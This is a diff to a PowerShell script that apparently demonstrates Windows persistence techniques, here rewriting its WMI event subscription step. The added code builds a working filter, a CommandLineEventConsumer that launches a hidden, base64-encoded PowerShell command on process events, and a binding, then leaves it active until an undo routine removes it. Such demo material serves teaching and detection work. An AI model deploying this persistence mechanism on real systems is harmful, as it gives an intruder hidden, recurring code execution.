@@ -365,11 +365,14 @@ function Undo-LiveChanges {
     $dir = 'C:\temp'
     $desktopPath = [Environment]::GetFolderPath('Desktop')
     $desktopFile = Join-Path -Path $desktopPath -ChildPath 'HI.txt'
+    $EventName = 'EventSubscription'
+    $wmiNamespace = 'root\subscription'
 
     if ($Global:DemoMode) {
         Write-Host "    [DEMO] Would remove registry value: $registryPath\$regKeyName" -ForegroundColor Yellow
         Write-Host "    [DEMO] Would remove file: $file" -ForegroundColor Yellow
         Write-Host "    [DEMO] Would remove desktop file: $desktopFile" -ForegroundColor Yellow
+        Write-Host "    [DEMO] Would remove WMI subscription: $EventName" -ForegroundColor Yellow
         Write-Host "    [DEMO] Would remove folder (if empty): $dir" -ForegroundColor Yellow
         return
     }
@@ -387,6 +390,45 @@ function Undo-LiveChanges {
     }
     catch {
         Write-Error "    [!] Failed to remove registry value: $($_.Exception.Message)"
+    }
+
+# Remove persistent WMI subscription if present
+    try {
+        if (Get-Command -Name Get-WmiObject -ErrorAction SilentlyContinue) {
+            $filter = Get-WmiObject -Namespace $wmiNamespace -Class __EventFilter -Filter "Name='$EventName'" -ErrorAction SilentlyContinue
+            if ($filter) {
+                $bindings = Get-WmiObject -Namespace $wmiNamespace -Class __FilterToConsumerBinding -Filter "Filter='$($filter.__RELPATH)'" -ErrorAction SilentlyContinue
+                foreach ($b in $bindings) { try { $b.Delete() } catch {} }
+                $consumer = Get-WmiObject -Namespace $wmiNamespace -Class CommandLineEventConsumer -Filter "Name='$EventName'" -ErrorAction SilentlyContinue
+                foreach ($c in $consumer) { try { $c.Delete() } catch {} }
+                try { $filter.Delete() } catch {}
+                Write-Host "    [OK] Removed persistent WMI subscription: $EventName" -ForegroundColor Green
+            }
+            else {
+                Write-Host "    [*] No persistent WMI subscription found: $EventName" -ForegroundColor Gray
+            }
+        }
+        elseif (Get-Command -Name Get-CimInstance -ErrorAction SilentlyContinue) {
+            $filter = Get-CimInstance -Namespace $wmiNamespace -ClassName __EventFilter -Filter "Name='$EventName'" -ErrorAction SilentlyContinue
+            if ($filter) {
+                $filterPath = $filter.__RELPATH
+                $bindings = Get-CimInstance -Namespace $wmiNamespace -ClassName __FilterToConsumerBinding -Filter "Filter='$filterPath'" -ErrorAction SilentlyContinue
+                foreach ($b in $bindings) { try { Remove-CimInstance -InputObject $b -ErrorAction SilentlyContinue } catch {} }
+                $consumers = Get-CimInstance -Namespace $wmiNamespace -ClassName CommandLineEventConsumer -Filter "Name='$EventName'" -ErrorAction SilentlyContinue
+                foreach ($c in $consumers) { try { Remove-CimInstance -InputObject $c -ErrorAction SilentlyContinue } catch {} }
+                try { Remove-CimInstance -InputObject $filter -ErrorAction SilentlyContinue } catch {}
+                Write-Host "    [OK] Removed persistent WMI subscription: $EventName" -ForegroundColor Green
+            }
+            else {
+                Write-Host "    [*] No persistent WMI subscription found: $EventName" -ForegroundColor Gray
+            }
+        }
+        else {
+            Write-Host "    [*] WMI removal tools not available in this PowerShell session." -ForegroundColor Gray
+        }
+    }
+    catch {
+        Write-Error "    [!] Failed to remove WMI subscription: $($_.Exception.Message)"
     }
 
     # Remove desktop file if present
@@ -441,6 +483,23 @@ function Show-WMIEventSub {
     $WmiNamespace = "root\subscription"
     $desktopPath = [Environment]::GetFolderPath('Desktop')
 
+    # If running in Live mode, ensure required persistent WMI helper cmdlets exist.
+    if (-not $Global:DemoMode) {
+        $required = @('New-WmiEventFilter','New-WmiEventConsumer','Register-WmiEventSubscriber','Unregister-WmiEventSubscriber')
+        $missing = @()
+        foreach ($c in $required) {
+            if (-not (Get-Command -Name $c -ErrorAction SilentlyContinue)) {
+                $missing += $c
+            }
+        }
+        if ($missing.Count -gt 0) {
+            Write-Warning "Persistent WMI subscription cmdlets not available: $($missing -join ', ')."
+            Write-Warning "Run this demo in Windows PowerShell 5.1 (powershell.exe) or install a module providing these cmdlets."
+            Write-Host "    [*] Skipping live WMI subscription due to missing cmdlets." -ForegroundColor Yellow
+            return
+        }
+    }
+
     if ($Global:DemoMode) {
         Write-Host "[+] Technique 6: WMI Event Subscription (DEMO ONLY - Not Executed)" -ForegroundColor Green
         Write-Host "    [*] WMI subscriptions allow code execution without files:" -ForegroundColor Gray
@@ -465,35 +524,63 @@ function Show-WMIEventSub {
 
         $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
         $EventName = "EventSubscription"
-        
-        # 1. Create the Event Filter (What triggers the action)
+
+        # 1. Create the Event Filter (What triggers the action) via WMI classes
         Write-Host "    [1/3] Creating WMI Event Filter..." -ForegroundColor Cyan
-        $EventFilter = New-WmiEventFilter -Name $EventName -Query "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA \\\"Win32_Process\\\""
-        
-        # 2. Create the Event Consumer (What the action is)
+        try {
+            $filterClass = [wmiclass]"\\.\$WmiNamespace:__EventFilter"
+            $filterInstance = $filterClass.CreateInstance()
+            $filterInstance.Name = $EventName
+            $filterInstance.Query = "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_Process'"
+            $filterInstance.QueryLanguage = "WQL"
+            $filterInstance.EventNamespace = "root\cimv2"
+            $filterResult = $filterInstance.Put()
+            Write-Host "    [OK] Event Filter created." -ForegroundColor Green
+        }
+        catch {
+            Write-Error "    [!] Failed to create Event Filter: $($_.Exception.Message)"
+            return
+        }
+
+        # 2. Create the Event Consumer (what will run)
         Write-Host "    [2/3] Creating WMI Event Consumer..." -ForegroundColor Cyan
-        $EventConsumer = New-WmiEventConsumer -Name $EventName -ScriptText "powershell.exe -EncodedCommand $EncodedPayload"
-        
-        # 3. Register the Subscription (Linking Filter and Consumer)
+        try {
+            $consumerClass = [wmiclass]"\\.\$WmiNamespace:CommandLineEventConsumer"
+            $consumerInstance = $consumerClass.CreateInstance()
+            $consumerInstance.Name = $EventName
+            $consumerInstance.CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $encodedPayload"
+            $consumerResult = $consumerInstance.Put()
+            Write-Host "    [OK] Event Consumer created." -ForegroundColor Green
+        }
+        catch {
+            Write-Error "    [!] Failed to create Event Consumer: $($_.Exception.Message)"
+            try { $filterInstance.Delete() } catch {}
+            return
+        }
+
+        # 3. Bind Filter -> Consumer (register subscription)
         Write-Host "    [3/3] Registering WMI Event Subscription..." -ForegroundColor Cyan
-        $Subscription = Register-WmiEventSubscriber -Name $EventName -Filter $EventFilter -Consumer $EventConsumer
-        
-        if ($Subscription) {
+        try {
+            $bindingClass = [wmiclass]"\\.\$WmiNamespace:__FilterToConsumerBinding"
+            $bindingInstance = $bindingClass.CreateInstance()
+            $bindingInstance.Filter = $filterInstance.__RELPATH
+            $bindingInstance.Consumer = $consumerInstance.__RELPATH
+            $bindingResult = $bindingInstance.Put()
             Write-Host "[+] WMI Event Subscription successfully registered." -ForegroundColor Green
             Write-Host "    [*] If a new process starts, the payload will execute." -ForegroundColor Green
             Write-Host "[*] Running a test process to verify subscription..." -ForegroundColor Yellow
-            
-            # --- Test Execution (optional, but helpful for a demo) ---
+
+            # --- Test Execution (optional) ---
             Start-Process calc.exe -NoNewWindow
-            
-            # Wait a moment for the event to fire
             Start-Sleep -Seconds 2
-            
-            # Cleanup
-            Unregister-WmiEventSubscriber -Name $EventName
-            Write-Host "[+] Cleaned up WMI subscription." -ForegroundColor Green
-        } else {
-            Write-Error "[!] Failed to register WMI Event Subscription."
+
+            Write-Host "[*] Subscription left in place (Undo will remove it)." -ForegroundColor Gray
+        }
+        catch {
+            Write-Error "    [!] Failed to create binding: $($_.Exception.Message)"
+            try { $consumerInstance.Delete() } catch {}
+            try { $filterInstance.Delete() } catch {}
+            return
         }
     }
 }
